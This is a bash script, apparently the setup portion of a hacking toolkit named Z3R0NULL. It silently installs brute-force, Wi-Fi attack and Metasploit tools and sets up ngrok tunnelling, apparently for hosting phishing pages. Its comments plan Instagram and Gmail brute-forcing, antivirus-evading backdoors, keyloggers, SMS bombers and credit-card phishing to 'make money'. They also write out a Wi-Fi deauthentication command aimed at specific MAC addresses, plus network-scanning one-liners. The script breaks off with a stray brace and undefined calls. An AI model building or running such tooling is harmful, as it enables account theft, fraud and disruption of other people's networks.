#!/bin/bash
###########

########################Z3R0########################
# Z3R0NULL v1.0                                    #
# Coded By: Z3R0                                   #
# GitHub: github.com/                              #
# Encoding: UTF-8 & ASCII                          #
# Lenguajes: HTML,PHP,JS,BASH,PYTHON,RUBY,CSS      #
# Contact: Instagram="" Telegram="" Youtube=""     #
# For Educational Purposes Only                    #
####################################################

##########VARIABLES##########

#MOST IMPORTANT VAR#
VAR="Haha Joke."
####################

#########COLORS#########
grey="\033[38;5;245;48m"
red="\e[0;91m"
green="\e[0;92m"
yellow="\e[1;93m"
blue="\e[0;94m"
magenta="\e[0;95m"
cyan="\e[0;96m"
white="\e[0;97m"
########################

###########COLORS BOLD###########
graybold="\033[38;5;245;48m\e[1m"
redbold="\e[0;91m\e[1m"
greenbold="\e[0;92m\e[1m"
hackerbold="\033[38;5;46m\e[1m"
orangebold="\e[1;93m\e[1m"
bluebold="\e[0;94m\e[1m"
magentabold="\e[0;95m\e[1m"
cyanbold="\e[0;96m\e[1m"
whitebold="\e[0;97m\e[1m"
#################################

##RESET COLOR##
reset="\e[0m"
###############

##BOLD FONT##
bold="\e[1m"
#############

####BLINK TEXT COLORS####
blinktextredbold="\e[0;91;5m\e[1m"
##################

###✔###
Y="[✔]"
#######

###✘###
N="[✘]"
#######

######SYSTEM DATE######
date=$(date +"%d/%m/%Y")
#######################

############################SCRIPT DIRECTORY############################
script_dir=$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
########################################################################

####CHECK ROOT####
check_root=$(id -u)
##################

######CHECK ARCH######
check_arch=$(uname -m)
######################

#SITE VAR#
site=""
##########

#SERVER PORT#
port="5555"
#############

###SERVER HOST###
host="localhost"
#################

#DETECT KEY INTERRUPT#
trap exit_script INT
######################

##CHECK NET RESET##
NETWORKRST="FALSE"
###################

###################LIST INTERFACES###################
wlan_interfaces=$(ip -o link show | grep -o 'wlan[0-9]\+')
#####################################################

##################CHECK INTERFACES##################
num_interfaces=$(echo "$wlan_interfaces" | wc -l)
####################################################

##########################PUBLIC IP##########################
PUBLICIP=$(dig +short myip.opendns.com @resolver1.opendns.com)
#############################################################

########################PHP CHECK PROCESS & KILL########################
php_check_process=$(ps -efw | grep php | grep -v grep | awk '{print $2}')
if [[ -z ${php_check_process} ]];then
:
else
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
########################################################################


#########################NGROK CHECK PROCESS & KILL#########################
ngrok_check_process=$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')
if [[ -z ${ngrok_check_process} ]];then
:
else
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
########################################################################

########################SSH CHECK PROCESS & KILL########################
ssh_check_process=$(ps -efw | grep ssh | grep -v grep | awk '{print $2}')
if [[ -z ${ssh_check_process} ]];then
:
else
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
########################################################################


# zenity --file-selection
# timeout 5s

#-#-#-#-#-FUTURE FEATURES-#-#-#-#-#
# ADD INSTAGRAM/GMAIL BRUTEFORCE
# ADD ENCRYPTED BACKDOORS AV BYPASS https://www.youtube.com/watch?v=WU43BsVXh5s
# ADD HASH CAT DECRYPT AND CRUNCH MAKE WORD LIST
# ADD SOME PROJECTS FOLDER
# ADD KEYLOGGERS
# ADD MORE PHISHING SITES https://github.com/Euronymou5/0ni-Phish https://github.com/trananhtuat/login-form-with-validation
# ADD PDF PAGE HACKING DWN UPD
# ADD GET CLIP VICTIM REJECTED
# ADD DEAUTH ALL
# ADD BOMBERS https://github.com/Darkmux/SETSMS
# ADD SCRIPTS FROM Downloads Folder
# Criptograpy categori
# more than google oculte hide link like insta etc
# function in for
# ADD CREDIT CARD PHIOSING MERCADO PAGO AND etc.. make money

# AUTO DETECT INTERFACE
# CHECK MAC INTERFACE ERROR OR SUCES SCAN
# BLOCK ALL
# UNLOCK ALL
# RESCAN
# nmap -T4 -A -sV <IP> #INFO IP GOOD
# host <IP>
# nmblookup -A <IP>
# dig -x <IP>
# nslookup <IP>
# ADD VIEV FULL DEVICES CONECTED
# echo -e "${bluebold}[${reset}02${bluebold}] WiFi (All Networks 2.4GHz) ${redbold}ADD${reset}"
# echo -e "${bluebold}[${reset}03${bluebold}] WiFi (Clients 2.4GHz) ${redbold}ADD${reset}"
# yersinia
# netdiscover 
# airodump to scan
# aireplay to deauth client
# airodump-ng --bssid --channel wlan0 --write Handshake
# -sP
# nmap -sL $(netstat -nr | awk '$1 == "0.0.0.0"{print$2}' | sed 's/.$/*/') | grep \(1
# sudo arp-scan --interface=wlan0 --localnet
# netdiscover
# arp -n
# iwconfig wlan0mon channel 11
# aireplay-ng -0 0 -a 68:F9:56:3C:81:6C -c BC:17:B8:B6:B5:B1 wlan0mon </dev/null &>/dev/null &
# nmap -sS -iL IPLISTSSRT.txt

#Banner #V0.4 Font: ANSI Shadow
banner(){
    echo -e ""
    echo -e "${redbold}███████╗██████╗ ██████╗  ██████╗${reset}${graybold} ███╗   ██╗██╗   ██╗██╗     ██╗     "
    echo -e "${redbold}╚══███╔╝╚════██╗██╔══██╗██╔═████╗${reset}${graybold}████╗  ██║██║   ██║██║     ██║     "
    echo -e "${redbold}  ███╔╝  █████╔╝██████╔╝██║██╔██║${reset}${graybold}██╔██╗ ██║██║   ██║██║     ██║     "
    echo -e "${redbold} ███╔╝   ╚═══██╗██╔══██╗████╔╝██║${reset}${graybold}██║╚██╗██║██║   ██║██║     ██║     "
    echo -e "${redbold}███████╗██████╔╝██║  ██║╚██████╔╝${reset}${graybold}██║ ╚████║╚██████╔╝███████╗███████╗"
    echo -e "${redbold}╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝${reset}${graybold} ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝"
    echo -e "                                                     WRITTEN BY ${reset}${blinktextredbold}ZERO${reset}"
    echo -e ""
}

#Banner #V0.3 Font: ANSI Shadow
banner0(){
    echo -e ""
    echo -e "${redbold}███████╗██████╗ ██████╗  ██████╗${reset}${graybold} ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
    echo -e "${redbold}╚══███╔╝╚════██╗██╔══██╗██╔═████╗${reset}${graybold}██╔══██╗██║  ██║██║██╔════╝██║  ██║"
    echo -e "${redbold}  ███╔╝  █████╔╝██████╔╝██║██╔██║${reset}${graybold}██████╔╝███████║██║███████╗███████║"
    echo -e "${redbold} ███╔╝   ╚═══██╗██╔══██╗████╔╝██║${reset}${graybold}██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
    echo -e "${redbold}███████╗██████╔╝██║  ██║╚██████╔╝${reset}${graybold}██║     ██║  ██║██║███████║██║  ██║"
    echo -e "${redbold}╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝${reset}${graybold} ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "                                                     WRITTEN BY ${reset}${blinktextredbold}ZERO${reset}"
    echo -e ""
}

#Banner #V0.2 Font: Calvin S
banner1(){
    echo -e ""
    echo -e "${redbold}╔═╗╔═╗╦═╗╔═╗${reset}${graybold}╔═╗╦ ╦╦╔═╗╦ ╦"
    echo -e "${redbold}╔═╝║╣ ╠╦╝║ ║${reset}${graybold}╠═╝╠═╣║╚═╗╠═╣"
    echo -e "${redbold}╚═╝╚═╝╩╚═╚═╝${reset}${graybold}╩  ╩ ╩╩╚═╝╩ ╩"
    echo -e "WRITTEN BY ${reset}${blinktextredbold}ZERO${reset}"
    echo -e ""
}

#Banner #V0.1 Font: JS Stick Letters
banner2(){
    echo -e ""
    echo -e "${redbold}__  ___  __   __  ${reset}${graybold} __          __      "
    echo -e "${redbold} / |__  |__) /  \ ${reset}${graybold}|__) |__| | /__' |__|"
    echo -e "${redbold}/_ |___ |  \ \__/ ${reset}${graybold}|    |  | | .__/ |  |"
    echo -e "WRITTEN BY ${reset}${blinktextredbold}ZERO${reset}"
    echo -e ""
}

#Check Root
check_root(){
    if [[ ${check_root} == "1" ]];then
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] THIS SCRIPT MUST BE RUN AS ROOT.!${reset}"
    exit
    else
    check_dependencies
    fi
}

#Check Dependencies
check_dependencies(){

#Check WGET    
if which wget >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING WGET   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install wget -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   WGET  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check CURL
if which curl >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING CURL   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install curl -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   CURL  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check MDK4
if which mdk4 >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING MDK4   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install mdk4 -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   MDK4  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check HEAD
if which head >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING HEAD   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install head -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   HEAD  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check UNZIP
if which unzip >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING  UNZIP  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install unzip -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   UNZIP INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check HYDRA
if which hydra >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING  HYDRA  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install hydra -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   HYDRA INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check LOLCAT
if which lolcat >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING LOLCAT  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install lolcat -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  LOLCAT INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check XCLIP
if which xclip >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING XCLIP  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install xclip -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  XCLIP INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check MD5SUM
if which md5sum >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING MD5SUM  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install md5sum -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  MD5SUM INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check JQ
if which jq >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]    INSTALLING JQ    [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install jq -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    JQ  INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check MAC-CHANGER
if which macchanger >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]   INSTALLING MAC-CHANGER   [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install macchanger -y &>/dev/null

    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]   MAC-CHANGER  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
fi

#Check PHP
if which php >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  PHP   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install php -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    PHP INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check SED
if which sed >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  SED   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install sed -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    SED INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check CUT
if which cut >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  CUT   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install cut -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    CUT INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check SSH
if which ssh >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  SSH   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install ssh -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    SSH INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check AIRCRACK-NG
if which aircrack-ng >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]   INSTALLING AIRCRACK-NG   [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install aircrack-ng -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]   AIRCRACK-NG  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check AIREPLAY-NG
if which aireplay-ng >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]   INSTALLING AIREPLAY-NG   [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install aireplay-ng -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]   AIREPLAY-NG  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check AIRODUMP-NG
if which airodump-ng >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]   INSTALLING AIRODUMP-NG   [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install airodump-ng -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]   AIRODUMP-NG  INSTALLED   [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check AIRMON-NG
if which airmon-ng >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]    INSTALLING AIRMON-NG    [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install airmon-ng -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]    AIRMON-NG  INSTALLED    [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check HTML2TEXT
if which html2text >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]    INSTALLING HTML2TEXT    [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install html2text -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]    HTML2TEXT  INSTALLED    [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check JDK
if which java >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  JDK   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install default-jdk -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    JDK INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check PV
if which pv >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  PV   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install pv -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    PV INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check AWK
if which awk >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  AWK   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install awk -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    AWK INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check FEH
if which feh >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]   INSTALLING  FEH   [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install feh -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]    FEH INSTALLED    [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check APKTOOL
if which apktool >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}] INSTALLING  APKTOOL [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install apktool -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  APKTOOL INSTALLED  [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check QRENCODE
if which qrencode >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}] INSTALLING QRENCODE [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install qrencode -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  QRENCODE INSTALLED  [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check XDG-OPEN
if which xdg-open >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}] INSTALLING XDG-OPEN [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"

    apt-get install xdg-open -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]  XDG-OPEN INSTALLED  [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Check METASPLOIT
if which msfconsole >/dev/null;then
    :
    else
    clear
    banner
    echo -e "${orangebold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${orangebold}]   INSTALLING  METASPLOIT   [${reset}*${orangebold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"

    apt-get install metasploit-framework -y &>/dev/null

    clear
    banner
    echo -e "${greenbold}"
    echo -e "                    ----------------------------   "
    echo -e "                 [${reset}*${greenbold}]    METASPLOIT INSTALLED    [${reset}*${greenbold}]"
    echo -e "                    ----------------------------   "
    echo -e "${reset}"
    sleep 1
fi

#Ngrok Installing Banner
ngrok_installing(){
    echo -e "${orangebold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${orangebold}]  INSTALLING  NGROK  [${reset}*${orangebold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
}

#Ngrok Installed Banner
ngrok_installed(){
    echo -e "${greenbold}"
    echo -e "                        ---------------------   "
    echo -e "                     [${reset}*${greenbold}]   NGROK INSTALLED   [${reset}*${greenbold}]"
    echo -e "                        ---------------------   "
    echo -e "${reset}"
}

#Check NGROK
cd ${script_dir}/.files || exit_script
if [[ -f "ngrok" ]];then
    :
    else
    if [[ ${check_arch} == *arm* || ${check_arch} == *Android* ]];then
    clear
    banner
    ngrok_installing
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip &>/dev/null
    unzip ngrok* &>/dev/null
    chmod 777 ngrok &>/dev/null
    rm -rf ngrok*.zip &>/dev/null
    clear
    banner
    ngrok_installed
    sleep 1
    cd ${script_dir} || exit_script
    elif [[ ${check_arch} == *aarch64* ]];then
    clear
    banner
    ngrok_installing
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip &>/dev/null
    unzip ngrok* &>/dev/null
    chmod 777 ngrok &>/dev/null
    rm -rf ngrok*.zip &>/dev/null
    clear
    banner
    ngrok_installed
    sleep 1
    cd ${script_dir} || exit_script
    elif [[ ${check_arch} == *x86_64* ]];then
    clear
    banner
    ngrok_installing
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &>/dev/null
    unzip ngrok* &>/dev/null
    chmod 777 ngrok &>/dev/null
    rm -rf ngrok*.zip &>/dev/null
    clear
    banner
    ngrok_installed
    sleep 1
    cd ${script_dir} || exit_script
    else
    clear
    banner
    ngrok_installing
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip &>/dev/null
    unzip ngrok* &>/dev/null
    chmod 777 ngrok &>/dev/null
    rm -rf ngrok*.zip &>/dev/null
    clear
    banner
    ngrok_installed
    sleep 1
    cd ${script_dir} || exit_script
	fi
fi

#Ngrok AUTHTOKEN Not Found Menu
ngrok_authtoken_not_found(){
    clear
    banner
    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Auth token does not exist. Do you want to create one?${reset} ${whitebold}(Y/N)${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] You can create an authtoken manually more info at${reset} ${whitebold}ngrok.com${reset}"
    echo -e "${orangebold}[${reset}*${orangebold}] You can skip this step and use ssh.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' ngrok_authtoken_not_found

    if [[ ${ngrok_authtoken_not_found} == "Y" ]] || [[ ${ngrok_authtoken_not_found} == "y" ]];then
    ngrok_create_authtoken
    elif [[ ${ngrok_authtoken_not_found} == "N" ]] || [[ ${ngrok_authtoken_not_found} == "n" ]];then
    echo "[*] This file is for skip ngrok auth token check." >> "${script_dir}/.files/SkipNG"
    else
    clear
    banner
    error_404
    sleep 1
    ngrok_authtoken_not_found
    fi
}

#Ngrok AUTHTOKEN Creator Menu
ngrok_create_authtoken(){
    clear
    banner
    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Paste an authtoken here.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' ngrok_create_authtoken

    ngrok_authtoken_save="authtoken: ${ngrok_create_authtoken}"
    echo "${ngrok_authtoken_save}" >> "${HOME}/.ngrok2/ngrok.yml"

    clear
    banner
    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Auth token saved.${reset}"
    sleep 1.5
}

#Check NGROK AUTHTOKEN
if [[ -f "${HOME}/.ngrok2/ngrok.yml" ]];then
    :
    elif [[ -f "${script_dir}/.files/SkipNG" ]];then
    :
    else
    mkdir ${HOME}/.ngrok2
    ngrok_authtoken_not_found
fi

#Loading Screen
tput civis
TIMEOUT=$((SECONDS+5))
while [ $SECONDS -lt $TIMEOUT ];do
    # Frame #1
    clear
    banner
    printf "${greenbold}[${reset}*${greenbold}] LOADING${reset}"
    sleep 0.5
    # Frame #2
    clear
    banner
    printf "${greenbold}[${reset}**${greenbold}] LOADING${reset}"
    sleep 0.5
    # Frame #3
    clear
    banner
    printf "${greenbold}[${reset}***${greenbold}] LOADING${reset}"
    sleep 0.5
done
CHECKONLINE=$(wget -q --spider http://google.com;echo $?)
if [[ $CHECKONLINE -eq 0 ]];then
:
else
    check_online
fi
yesorno
}

check_online(){
    tput cnorm
    clear
    banner
    echo -e "${orangebold}[${reset}*${orangebold}] NO INTERNET CONNECTION. YOU WANT TO CONTINUE?${reset} ${whitebold}(Y/N)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' check_online

    if [[ ${check_online} == "Y" ]] || [[ ${check_online} == "y" ]];then
    yesorno
    elif [[ ${check_online} == "N" ]] || [[ ${check_online} == "n" ]];then
    clear
    banner
    exit
    else
    clear
    banner
    error_404
    sleep 1
    check_online
    fi
}

